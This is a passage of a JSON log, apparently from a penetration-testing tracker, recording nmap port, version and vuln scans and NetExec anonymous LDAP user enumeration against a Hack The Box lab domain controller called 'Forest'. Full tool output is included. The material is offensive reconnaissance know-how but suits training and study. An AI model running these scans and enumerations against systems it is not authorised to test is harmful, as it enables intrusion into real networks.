10.129.105.202  389    FOREST           SM_ca8c2ed5bdab4dc9b          <never>             0                                                                    \nLDAP                     10.129.105.202  389    FOREST           SM_75a538d3025e4db9a          <never>             0                                                                    \nLDAP                     10.129.105.202  389    FOREST           SM_681f53d4942840e18          <never>             0                                                                    \nLDAP                     10.129.105.202  389    FOREST           SM_1b41c9286325456bb          <never>             0                                                                    \nLDAP                     10.129.105.202  389    FOREST           SM_9b69f1b9d2cc45549          <never>             0                                                                    \nLDAP                     10.129.105.202  389    FOREST           SM_7c96b981967141ebb          <never>             0                                                                    \nLDAP                     10.129.105.202  389    FOREST           SM_c75ee099d0a64c91b          <never>             0                                                                    \nLDAP                     10.129.105.202  389    FOREST           SM_1ffab36a2f5f479cb          <never>             0                                                                    \nLDAP                     10.129.105.202  389    FOREST           HealthMailboxc3d7722          2019-09-23 18:51:31 0                                                                    \nLDAP                     10.129.105.202  389    FOREST           HealthMailboxfc9daad          2019-09-23 18:51:35 0                                                                    \nLDAP                     10.129.105.202  389    FOREST           HealthMailboxc0a90c9          2019-09-19 07:56:35 0                                                                    \nLDAP                     10.129.105.202  389    FOREST           HealthMailbox670628e          2019-09-19 07:56:45 0                                                                    \nLDAP                     10.129.105.202  389    FOREST           HealthMailbox968e74d          2019-09-19 07:56:56 0                                                                    \nLDAP                     10.129.105.202  389    FOREST           HealthMailbox6ded678          2019-09-19 07:57:06 0                                                                    \nLDAP                     10.129.105.202  389    FOREST           HealthMailbox83d6781          2019-09-19 07:57:17 0                                                                    \nLDAP                     10.129.105.202  389    FOREST           HealthMailboxfd87238          2019-09-19 07:57:27 0                                                                    \nLDAP                     10.129.105.202  389    FOREST           HealthMailboxb01ac64          2019-09-19 07:57:37 0                                                                    \nLDAP                     10.129.105.202  389    FOREST           HealthMailbox7108a4e          2019-09-19 07:57:48 0                                                                    \nLDAP                     10.129.105.202  389    FOREST           HealthMailbox0659cc1          2019-09-19 07:57:58 0                                                                    \nLDAP                     10.129.105.202  389    FOREST           sebastien                     2019-09-19 20:29:59 0                                                                    \nLDAP                     10.129.105.202  389    FOREST           lucinda                       2019-09-19 20:44:13 0                                                                    \nLDAP                     10.129.105.202  389    FOREST           svc-alfresco                  2026-10-11 14:46:10 0                                                                    \nLDAP                     10.129.105.202  389    FOREST           andy                          2019-09-22 18:44:16 0                                                                    \nLDAP                     10.129.105.202  389    FOREST           mark                          2019-09-20 18:57:30 0                                                                    \nLDAP                     10.129.105.202  389    FOREST           santi                         2019-09-20 19:02:55 0                                                                    \n                                                                                                                                 \n[2026-10-11 18:41:52 UTC] [tun0:10.10.14.191]\n",
+        "sample": "┌──(kali㉿kali)-[~/ctf/htb/windows/forest]\n└─$ nxc ldap 10.129.105.202 -u '' -p '' --users | tee scans/ldap-users.txt\nLDAP                     10.129.105.202  389    FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local) (signing:None) (channel binding:No TLS cert) \nLDAP                     10.129.105.202  389    FOREST           [+] htb.local\\: \nLDAP            "
+      },
+      {
+        "at": 1791744091710,
+        "command": "nxc ldap 10.129.105.202 -u '' -p ''",
+        "dispatch": "nxc ldap 10.129.105.202 -u '' -p ''  nxc ldap 10.129.105.202 -u '' -p ''  nxc ldap",
+        "source": "paste",
+        "tool": "nxc",
+        "target": "10.129.105.202",
+        "scope": "host:10.129.105.202",
+        "file": "",
+        "action_id": "ad-anon-ldap-enum",
+        "produced": [
+          "ad.domain_known",
+          "ad.base_dn",
+          "host.domain",
+          "host.hostname",
+          "ad.dc_candidate",
+          "ldap.reachable",
+          "ad.anonymous_bind"
+        ],
+        "stdout": "┌──(kali㉿kali)-[~/ctf/htb/windows/forest]\n└─$ nxc ldap 10.129.105.202 -u '' -p ''\n[*] First time use detected\n[*] Creating home directory structure\n[*] Creating missing folder logs\n[*] Creating missing folder modules\n[*] Creating missing folder workspaces\n[*] Creating missing folder obfuscated_scripts\n[*] Creating missing folder screenshots\n[*] Creating missing folder logs/sam\n[*] Creating missing folder logs/lsa\n[*] Creating missing folder logs/ntds\n[*] Creating missing folder logs/dpapi\n[*] Creating default workspace\n[*] Initializing WINRM protocol database\n[*] Initializing SMB protocol database\n[*] Initializing VNC protocol database\n[*] Initializing NFS protocol database\n[*] Initializing FTP protocol database\n[*] Initializing MSSQL protocol database\n[*] Initializing RDP protocol database\n[*] Initializing SSH protocol database\n[*] Initializing LDAP protocol database\n[*] Initializing WMI protocol database\n[*] Copying default configuration file\nLDAP        10.129.105.202  389    FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local) (signing:None) (channel binding:No TLS cert)                                                                                        \nLDAP        10.129.105.202  389    FOREST           [+] htb.local\\: \n                                                                                                                                 \n[2026-10-11 18:41:20 UTC] [tun0:10.10.14.191]\n",
+        "sample": "┌──(kali㉿kali)-[~/ctf/htb/windows/forest]\n└─$ nxc ldap 10.129.105.202 -u '' -p ''\n[*] First time use detected\n[*] Creating home directory structure\n[*] Creating missing folder logs\n[*] Creating missing folder modules\n[*] Creating missing folder workspaces\n[*] Creating missing folder obfuscated_scripts\n[*] Creating missing folder screenshots\n[*] Creating missing folder logs/sam\n[*] Creating missing"
+      },
+      {
+        "at": 1791741371540,
+        "command": "nmap -Pn -sV --script vuln -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-vuln.txt 10.129.105.202",
+        "dispatch": "nmap -Pn -sV --script vuln -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-vuln.txt 10.129.105.202  nmap -Pn -sV --script vuln -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-vuln.txt 10.129.105.202  Nmap scan report for 10.129.105.202  Host is up (0.034s latency).  Host script results:  Nmap done: 1 IP address (1 host up) scanned in 313.21 seconds  nmap scan",
+        "source": "paste",
+        "tool": "nmap",
+        "target": "10.129.105.202",
+        "scope": "host:10.129.105.202",
+        "file": "",
+        "action_id": "nmap-vuln-scripts",
+        "produced": [
+          "host.os_hint",
+          "host.os_family",
+          "host.up",
+          "scan.nmap.quick",
+          "scan.nmap.version",
+          "scan.nmap.vuln",
+          "port:135",
+          "service.msrpc",
+          "port:139",
+          "service.smb",
+          "smb.reachable",
+          "port:3268",
+          "service.ldap",
+          "ldap.reachable",
+          "port:3269",
+          "service.tcpwrapped",
+          "ldap.reachable",
+          "port:389",
+          "service.ldap",
+          "ldap.reachable",
+          "port:445",
+          "service.smb",
+          "smb.reachable",
+          "port:464",
+          "service.kpasswd5",
+          "port:47001",
+          "service.http",
+          "winrm.reachable",
+          "host.os_hint",
+          "port:49664",
+          "service.msrpc",
+          "port:49665",
+          "service.msrpc",
+          "port:49666",
+          "service.msrpc",
+          "port:49668",
+          "service.msrpc",
+          "port:49670",
+          "service.msrpc",
+          "port:49676",
+          "service.ncacn_http",
+          "port:49677",
+          "service.msrpc",
+          "port:49683",
+          "service.msrpc",
+          "port:49698",
+          "service.msrpc",
+          "port:49952",
+          "service.msrpc",
+          "port:53",
+          "service.dns",
+          "dns.reachable",
+          "port:593",
+          "service.ncacn_http",
+          "port:5985",
+          "service.http",
+          "winrm.reachable",
+          "host.os_hint",
+          "port:636",
+          "service.tcpwrapped",
+          "ldap.reachable",
+          "port:88",
+          "service.kerberos-sec",
+          "kerberos.reachable",
+          "port:9389",
+          "service.mc-nmf",
+          "ports.open",
+          "ad.dc_candidate",
+          "blocker.access_denied"
+        ],
+        "stdout": "┌──(kali㉿kali)-[~/ctf/htb/windows/forest]\n└─$ nmap -Pn -sV --script vuln -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-vuln.txt 10.129.105.202\nStarting Nmap 7.99 ( https://nmap.org ) at 2026-10-11 13:50 -0400\nNmap scan report for 10.129.105.202\nHost is up (0.034s latency).\n\nPORT      STATE SERVICE      VERSION\n53/tcp    open  domain       Simple DNS Plus\n88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2026-10-11 17:56:23Z)\n135/tcp   open  msrpc        Microsoft Windows RPC\n139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn\n389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: HTB)\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped\n3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped\n5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-csrf: Couldn't find any CSRF vulnerabilities.\n|_http-dombased-xss: Couldn't find any DOM based XSS.\n|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.\n|_http-server-header: Microsoft-HTTPAPI/2.0\n9389/tcp  open  mc-nmf       .NET Message Framing\n47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-csrf: Couldn't find any CSRF vulnerabilities.\n|_http-dombased-xss: Couldn't find any DOM based XSS.\n|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.\n|_http-server-header: Microsoft-HTTPAPI/2.0\n49664/tcp open  msrpc        Microsoft Windows RPC\n49665/tcp open  msrpc        Microsoft Windows RPC\n49666/tcp open  msrpc        Microsoft Windows RPC\n49668/tcp open  msrpc        Microsoft Windows RPC\n49670/tcp open  msrpc        Microsoft Windows RPC\n49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0\n49677/tcp open  msrpc        Microsoft Windows RPC\n49683/tcp open  msrpc        Microsoft Windows RPC\n49698/tcp open  msrpc        Microsoft Windows RPC\n49952/tcp open  msrpc        Microsoft Windows RPC\nService Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_smb-vuln-ms10-054: false\n|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 313.21 seconds\n                                                                                                                                 \n[2026-10-11 17:55:58 UTC] [tun0:10.10.14.191]\n",
+        "sample": "┌──(kali㉿kali)-[~/ctf/htb/windows/forest]\n└─$ nmap -Pn -sV --script vuln -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-vuln.txt 10.129.105.202\nStarting Nmap 7.99 ( https://nmap.org ) at 2026-10-11 13:50 -0400\nNmap scan report for 10.129.105.202\nHost is up (0.034s latency).\n\nPORT      STATE SERVICE      VERS"
+      },
+      {
+        "at": 1791741035065,
+        "command": "nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-version.txt -oX - 10.129.105.202",
+        "dispatch": "nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-version.txt -oX - 10.129.105.202  nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-version.txt -oX - 10.129.105.202",
+        "source": "paste",
+        "tool": "nmap",
+        "target": "10.129.105.202",
+        "scope": "host:10.129.105.202",
+        "file": "",
+        "action_id": "nmap-version-scripts",
+        "produced": [
+          "host.up",
+          "port:135",
+          "service.msrpc",
+          "port:139",
+          "service.smb",
+          "smb.reachable",
+          "port:3268",
+          "service.ldap",
+          "ldap.reachable",
+          "port:3269",
+          "service.tcpwrapped",
+          "ldap.reachable",
+          "port:389",
+          "service.ldap",
+          "ldap.reachable",
+          "port:445",
+          "service.smb",
+          "smb.reachable",
+          "port:464",
+          "service.kpasswd5",
+          "port:47001",
+          "service.http",
+          "winrm.reachable",
+          "host.os_hint",
+          "port:49664",
+          "service.msrpc",
+          "port:49665",
+          "service.msrpc",
+          "port:49666",
+          "service.msrpc",
+          "port:49668",
+          "service.msrpc",
+          "port:49670",
+          "service.msrpc",
+          "port:49676",
+          "service.ncacn_http",
+          "port:49677",
+          "service.msrpc",
+          "port:49683",
+          "service.msrpc",
+          "port:49698",
+          "service.msrpc",
+          "port:49952",
+          "service.msrpc",
+          "port:53",
+          "service.dns",
+          "dns.reachable",
+          "port:593",
+          "service.ncacn_http",
+          "port:5985",
+          "service.http",
+          "winrm.reachable",
+          "host.os_hint",
+          "port:636",
+          "service.tcpwrapped",
+          "ldap.reachable",
+          "port:88",
+          "service.kerberos-sec",
+          "kerberos.reachable",
+          "port:9389",
+          "service.mc-nmf",
+          "ports.open",
+          "scan.nmap.quick",
+          "scan.nmap.version",
+          "host.os_hint",
+          "host.os_family",
+          "ad.domain_known",
+          "ad.base_dn",
+          "host.domain",
+          "host.hostname",
+          "host.fqdn",
+          "smb.signing",
+          "ad.dc_candidate"
+        ],
+        "stdout": "┌──(kali㉿kali)-[~/ctf/htb/windows/forest]\n└─$ nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-version.txt -oX - 10.129.105.202\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE nmaprun>\n<?xml-stylesheet href=\"file:///usr/share/nmap/nmap.xsl\" type=\"text/xsl\"?>\n<!-- Nmap 7.99 scan initiated Sun Oct 11 13:49:08 2026 as: /usr/lib/nmap/nmap -&#45;privileged -Pn -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-version.txt -oX - 10.129.105.202 -->\n<nmaprun scanner=\"nmap\" args=\"/usr/lib/nmap/nmap -&#45;privileged -Pn -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-version.txt -oX - 10.129.105.202\" start=\"1791740948\" startstr=\"Sun Oct 11 13:49:08 2026\" version=\"7.99\" xmloutputversion=\"1.05\">\n<scaninfo type=\"syn\" protocol=\"tcp\" numservices=\"24\" services=\"53,88,135,139,389,445,464,593,636,3268-3269,5985,9389,47001,49664-49666,49668,49670,49676-49677,49683,49698,49952\"/>\n<verbose level=\"0\"/>\n<debugging level=\"0\"/>\n<host starttime=\"1791740949\" endtime=\"1791741014\"><status state=\"up\" reason=\"user-set\" reason_ttl=\"0\"/>\n<address addr=\"10.129.105.202\" addrtype=\"ipv4\"/>\n<hostnames>\n</hostnames>\n<ports><port protocol=\"tcp\" portid=\"53\"><state state=\"open\" reason=\"syn-ack\" reason_ttl=\"127\"/><service name=\"domain\" product=\"Simple DNS Plus\" ostype=\"Windows\" method=\"probed\" conf=\"10\"><cpe>cpe:/a:jh_software:simple_dns_plus</cpe><cpe>cpe:/o:microsoft:windows</cpe></service></port>\n<port protocol=\"tcp\" portid=\"88\"><state state=\"open\" reason=\"syn-ack\" reason_ttl=\"127\"/><service name=\"kerberos-sec\" product=\"Microsoft Windows Kerberos\" extrainfo=\"server time: 2026-10-11 17:54:36Z\" ostype=\"Windows\" method=\"probed\" conf=\"10\"><cpe>cpe:/a:microsoft:kerberos</cpe><cpe>cpe:/o:microsoft:windows</cpe></service></port>\n<port protocol=\"tcp\" portid=\"135\"><state state=\"open\" reason=\"syn-ack\" reason_ttl=\"127\"/><service name=\"msrpc\" product=\"Microsoft Windows RPC\" ostype=\"Windows\" method=\"probed\" conf=\"10\"><cpe>cpe:/o:microsoft:windows</cpe></service></port>\n<port protocol=\"tcp\" portid=\"139\"><state state=\"open\" reason=\"syn-ack\" reason_ttl=\"127\"/><service name=\"netbios-ssn\" product=\"Microsoft Windows netbios-ssn\" ostype=\"Windows\" method=\"probed\" conf=\"10\"><cpe>cpe:/o:microsoft:windows</cpe></service></port>\n<port protocol=\"tcp\" portid=\"389\"><state state=\"open\" reason=\"syn-ack\" reason_ttl=\"127\"/><service name=\"ldap\" product=\"Microsoft Windows Active Directory LDAP\" extrainfo=\"Domain: htb.local, Site: Default-First-Site-Name\" hostname=\"FOREST\" ostype=\"Windows\" method=\"probed\" conf=\"10\"><cpe>cpe:/o:microsoft:windows</cpe></service></port>\n<port protocol=\"tcp\" portid=\"445\"><state state=\"open\" reason=\"syn-ack\" reason_ttl=\"127\"/><service name=\"microsoft-ds\" product=\"Windows Server 2016 Standard 14393 microsoft-ds\" extrainfo=\"workgroup: HTB\" hostname=\"FOREST\" ostype=\"Windows\" method=\"probed\" conf=\"10\"><cpe>cpe:/o:microsoft:windows</cpe></service></port>\n<port protocol=\"tcp\" portid=\"464\"><state state=\"open\" reason=\"syn-ack\" reason_ttl=\"127\"/><service name=\"kpasswd5\" method=\"table\" conf=\"3\"/></port>\n<port protocol=\"tcp\" portid=\"593\"><state state=\"open\" reason=\"syn-ack\" reason_ttl=\"127\"/><service name=\"ncacn_http\" product=\"Microsoft Windows RPC over HTTP\" version=\"1.0\" ostype=\"Windows\" method=\"probed\" conf=\"10\"><cpe>cpe:/o:microsoft:windows</cpe></service></port>\n<port protocol=\"tcp\" portid=\"636\"><state state=\"open\" reason=\"syn-ack\" reason_ttl=\"127\"/><service name=\"tcpwrapped\" method=\"probed\" conf=\"8\"/></port>\n<port protocol=\"tcp\" portid=\"3268\"><state state=\"open\" reason=\"syn-ack\" reason_ttl=\"127\"/><service name=\"ldap\" product=\"Microsoft Windows Active Directory LDAP\" extrainfo=\"Domain: htb.local, Site: Default-First-Site-Name\" hostname=\"FOREST\" ostype=\"Windows\" method=\"probed\" conf=\"10\"><cpe>cpe:/o:microsoft:windows</cpe></service></port>\n<port protocol=\"tcp\" portid=\"3269\"><state state=\"open\" reason=\"syn-ack\" reason_ttl=\"127\"/><service name=\"tcpwrapped\" method=\"probed\" conf=\"8\"/></port>\n<port protocol=\"tcp\" portid=\"5985\"><state state=\"open\" reason=\"syn-ack\" reason_ttl=\"127\"/><service name=\"http\" product=\"Microsoft HTTPAPI httpd\" version=\"2.0\" extrainfo=\"SSDP/UPnP\" ostype=\"Windows\" method=\"probed\" conf=\"10\"><cpe>cpe:/o:microsoft:windows</cpe></service><script id=\"http-server-header\" output=\"Microsoft-HTTPAPI/2.0\"><elem>Microsoft-HTTPAPI/2.0</elem>\n</script><script id=\"http-title\" output=\"Not Found\"><elem key=\"title\">Not Found</elem>\n</script></port>\n<port protocol=\"tcp\" portid=\"9389\"><state state=\"open\" reason=\"syn-ack\" reason_ttl=\"127\"/><service name=\"mc-nmf\" product=\".NET Message Framing\" ostype=\"Windows\" method=\"probed\" conf=\"10\"><cpe>cpe:/o:microsoft:windows</cpe></service></port>\n<port protocol=\"tcp\" portid=\"47001\"><state state=\"open\" reason=\"syn-ack\" reason_ttl=\"127\"/><service name=\"http\" product=\"Microsoft HTTPAPI httpd\" version=\"2.0\" extrainfo=\"SSDP/UPnP\" ostype=\"Windows\" method=\"probed\" conf=\"10\"><cpe>cpe:/o:microsoft:windows</cpe></service><script id=\"http-server-header\" output=\"Microsoft-HTTPAPI/2.0\"><elem>Microsoft-HTTPAPI/2.0</elem>\n</script><script id=\"http-title\" output=\"Not Found\"><elem key=\"title\">Not Found</elem>\n</script></port>\n<port protocol=\"tcp\" portid=\"49664\"><state state=\"open\" reason=\"syn-ack\" reason_ttl=\"127\"/><service name=\"msrpc\" product=\"Microsoft Windows RPC\" ostype=\"Windows\" method=\"probed\" conf=\"10\"><cpe>cpe:/o:microsoft:windows</cpe></service></port>\n<port protocol=\"tcp\" portid=\"49665\"><state state=\"open\" reason=\"syn-ack\" reason_ttl=\"127\"/><service name=\"msrpc\" product=\"Microsoft Windows RPC\" ostype=\"Windows\" method=\"probed\" conf=\"10\"><cpe>cpe:/o:microsoft:windows</cpe></service></port>\n<port protocol=\"tcp\" portid=\"49666\"><state state=\"open\" reason=\"syn-ack\" reason_ttl=\"127\"/><service name=\"msrpc\" product=\"Microsoft Windows RPC\" ostype=\"Windows\" method=\"probed\" conf=\"10\"><cpe>cpe:/o:microsoft:windows</cpe></service></port>\n<port protocol=\"tcp\" portid=\"49668\"><state state=\"open\" reason=\"syn-ack\" reason_ttl=\"127\"/><service name=\"msrpc\" product=\"Microsoft Windows RPC\" ostype=\"Windows\" method=\"probed\" conf=\"10\"><cpe>cpe:/o:microsoft:windows</cpe></service></port>\n<port protocol=\"tcp\" portid=\"49670\"><state state=\"open\" reason=\"syn-ack\" reason_ttl=\"127\"/><service name=\"msrpc\" product=\"Microsoft Windows RPC\" ostype=\"Windows\" method=\"probed\" conf=\"10\"><cpe>cpe:/o:microsoft:windows</cpe></service></port>\n<port protocol=\"tcp\" portid=\"49676\"><state state=\"open\" reason=\"syn-ack\" reason_ttl=\"127\"/><service name=\"ncacn_http\" product=\"Microsoft Windows RPC over HTTP\" version=\"1.0\" ostype=\"Windows\" method=\"probed\" conf=\"10\"><cpe>cpe:/o:microsoft:windows</cpe></service></port>\n<port protocol=\"tcp\" portid=\"49677\"><state state=\"open\" reason=\"syn-ack\" reason_ttl=\"127\"/><service name=\"msrpc\" product=\"Microsoft Windows RPC\" ostype=\"Windows\" method=\"probed\" conf=\"10\"><cpe>cpe:/o:microsoft:windows</cpe></service></port>\n<port protocol=\"tcp\" portid=\"49683\"><state state=\"open\" reason=\"syn-ack\" reason_ttl=\"127\"/><service name=\"msrpc\" product=\"Microsoft Windows RPC\" ostype=\"Windows\" method=\"probed\" conf=\"10\"><cpe>cpe:/o:microsoft:windows</cpe></service></port>\n<port protocol=\"tcp\" portid=\"49698\"><state state=\"open\" reason=\"syn-ack\" reason_ttl=\"127\"/><service name=\"msrpc\" product=\"Microsoft Windows RPC\" ostype=\"Windows\" method=\"probed\" conf=\"10\"><cpe>cpe:/o:microsoft:windows</cpe></service></port>\n<port protocol=\"tcp\" portid=\"49952\"><state state=\"open\" reason=\"syn-ack\" reason_ttl=\"127\"/><service name=\"msrpc\" product=\"Microsoft Windows RPC\" ostype=\"Windows\" method=\"probed\" conf=\"10\"><cpe>cpe:/o:microsoft:windows</cpe></service></port>\n</ports>\n<hostscript><script id=\"smb2-security-mode\" output=\"&#xa;  3.1.1: &#xa;    Message signing enabled and required\"><table key=\"3.1.1\">\n<elem>Message signing enabled and required</elem>\n</table>\n</script><script id=\"smb2-time\" output=\"&#xa;  date: 2026-10-11T17:55:27&#xa;  start_date: 2026-10-11T17:47:10\"><elem key=\"date\">2026-10-11T17:55:27</elem>\n<elem key=\"start_date\">2026-10-11T17:47:10</elem>\n</script><script id=\"smb-os-discovery\" output=\"&#xa;  OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)&#xa;  Computer name: FOREST&#xa;  NetBIOS computer name: FOREST\\x00&#xa;  Domain name: htb.local&#xa;  Forest name: htb.local&#xa;  FQDN: FOREST.htb.local&#xa;  System time: 2026-10-11T10:55:25-07:00&#xa;\"><elem key=\"os\">Windows Server 2016 Standard 14393</elem>\n<elem key=\"lanmanager\">Windows Server 2016 Standard 6.3</elem>\n<elem key=\"server\">FOREST\\x00</elem>\n<elem key=\"date\">2026-10-11T10:55:25-07:00</elem>\n<elem key=\"fqdn\">FOREST.htb.local</elem>\n<elem key=\"domain_dns\">htb.local</elem>\n<elem key=\"forest_dns\">htb.local</elem>\n<elem key=\"workgroup\">HTB\\x00</elem>\n</script><script id=\"smb-security-mode\" output=\"&#xa;  account_used: &lt;blank&gt;&#xa;  authentication_level: user&#xa;  challenge_response: supported&#xa;  message_signing: required\"><elem key=\"account_used\">&lt;blank&gt;</elem>\n<elem key=\"authentication_level\">user</elem>\n<elem key=\"challenge_response\">supported</elem>\n<elem key=\"message_signing\">required</elem>\n</script><script id=\"clock-skew\" output=\"mean: 2h25m21s, deviation: 4h02m29s, median: 5m20s\"><elem key=\"stddev\">14549</elem>\n<elem key=\"median\">320</elem>\n<elem key=\"mean\">8721</elem>\n<elem key=\"count\">3</elem>\n</script></hostscript><times srtt=\"33243\" rttvar=\"1532\" to=\"100000\"/>\n</host>\n<runstats><finished time=\"1791741014\" timestr=\"Sun Oct 11 13:50:14 2026\" summary=\"Nmap done at Sun Oct 11 13:50:14 2026; 1 IP address (1 host up) scanned in 66.67 seconds\" elapsed=\"66.67\" exit=\"success\"/><hosts up=\"1\" down=\"0\" total=\"1\"/>\n</runstats>\n</nmaprun>\n                                                                                                                                 \n[2026-10-11 17:50:14 UTC] [tun0:10.10.14.191]\n",
+        "sample": "┌──(kali㉿kali)-[~/ctf/htb/windows/forest]\n└─$ nmap -Pn -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49676,49677,49683,49698,49952 -oN scans/nmap-version.txt -oX - 10.129.105.202\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE nmaprun>\n<?xml-stylesheet href=\"file:///usr/share/nmap/nmap.xsl\" type=\"text/xsl\"?>\n<!-- Nmap 7.99 scan initiated Sun "
+      },
+      {
+        "at": 1791740941211,
+        "command": "nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.129.105.202",
+        "dispatch": "nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.129.105.202  nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.129.105.202  Nmap scan report for 10.129.105.202  Host is up (0.032s latency).  Nmap done: 1 IP address (1 host up) scanned in 12.38 seconds  nmap scan",
+        "source": "paste",
+        "tool": "nmap",
+        "target": "10.129.105.202",
+        "scope": "host:10.129.105.202",
+        "file": "",
+        "action_id": "nmap-fast-open-ports",
+        "produced": [
+          "host.up",
+          "scan.nmap.quick",
+          "port:135",
+          "service.msrpc",
+          "port:139",
+          "service.smb",
+          "smb.reachable",
+          "port:3268",
+          "service.globalcatldap",
+          "ldap.reachable",
+          "port:3269",
+          "service.globalcatldapssl",
+          "ldap.reachable",
+          "port:389",
+          "service.ldap",
+          "ldap.reachable",
+          "port:445",
+          "service.smb",
+          "smb.reachable",
+          "port:464",
+          "service.kpasswd5",
+          "port:47001",
+          "service.winrm",
+          "winrm.reachable",
+          "host.os_hint",
+          "port:49664",
+          "service.unknown",
+          "port:49665",
+          "service.unknown",
+          "port:49666",
+          "service.unknown",
+          "port:49668",
+          "service.unknown",
+          "port:49670",
+          "service.unknown",
+          "port:49676",
+          "service.unknown",
+          "port:49677",
+          "service.unknown",
+          "port:49683",
+          "service.unknown",
+          "port:49698",
+          "service.unknown",
+          "port:49952",
+          "service.unknown",
+          "port:53",
+          "service.dns",
+          "dns.reachable",
+          "port:593",
+          "service.http-rpc-epmap",
+          "port:5985",
+          "service.wsman",
+          "winrm.reachable",
+          "host.os_hint",
+          "port:636",
+          "service.ldapssl",
+          "ldap.reachable",
+          "port:88",
+          "service.kerberos-sec",
+          "kerberos.reachable",
+          "port:9389",
+          "service.adws",
+          "ports.open",
+          "ad.dc_candidate"
+        ],
+        "stdout": "[2026-10-11 17:48:04 UTC] [tun0:10.10.14.191]\n┌──(kali㉿kali)-[~/ctf/htb/windows/forest]\n└─$ nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.129.105.202\nStarting Nmap 7.99 ( https://nmap.org ) at 2026-10-11 13:48 -0400\nNmap scan report for 10.129.105.202\nHost is up (0.032s latency).\nNot shown: 65497 closed tcp ports (reset), 14 filtered tcp ports (no-response)\nSome closed ports may be reported as filtered due to --defeat-rst-ratelimit\nPORT      STATE SERVICE\n53/tcp    open  domain\n88/tcp    open  kerberos-sec\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n593/tcp   open  http-rpc-epmap\n636/tcp   open  ldapssl\n3268/tcp  open  globalcatLDAP\n3269/tcp  open  globalcatLDAPssl\n5985/tcp  open  wsman\n9389/tcp  open  adws\n47001/tcp open  winrm\n49664/tcp open  unknown\n49665/tcp open  unknown\n49666/tcp open  unknown\n49668/tcp open  unknown\n49670/tcp open  unknown\n49676/tcp open  unknown\n49677/tcp open  unknown\n49683/tcp open  unknown\n49698/tcp open  unknown\n49952/tcp open  unknown\n\nNmap done: 1 IP address (1 host up) scanned in 12.38 seconds\n",
+        "sample": "[2026-10-11 17:48:04 UTC] [tun0:10.10.14.191]\n┌──(kali㉿kali)-[~/ctf/htb/windows/forest]\n└─$ nmap -Pn -p- --min-rate 5000 --open -oN scans/nmap-allports.txt 10.129.105.202\nStarting Nmap 7.99 ( https://nmap.org ) at 2026-10-11 13:48 -0400\nNmap scan report for 10.129.105.202\nHost is up (0.032s latency).\nNot shown: 65497 closed tcp ports (reset), 14 filtered tcp ports (no-response)\nSome closed ports m"
+      }
+    ],
+    "checklist": {},
+    "bloodhound": null,
+    "facts": [
+      {
+        "kind": "target.configured",
+        "scope": "host:10.129.105.202",
+        "value": {},
+        "state": "supported",
+        "source": "engagement",
+        "created_at": 1791740875.426
+      },
+      {
+        "kind": "host.up",
+        "scope": "host:10.129.105.202",
+        "value": {
+          "target": "10.129.105.202",
+          "latency": "0.032s latency"
+        },
+        "state": "supported",
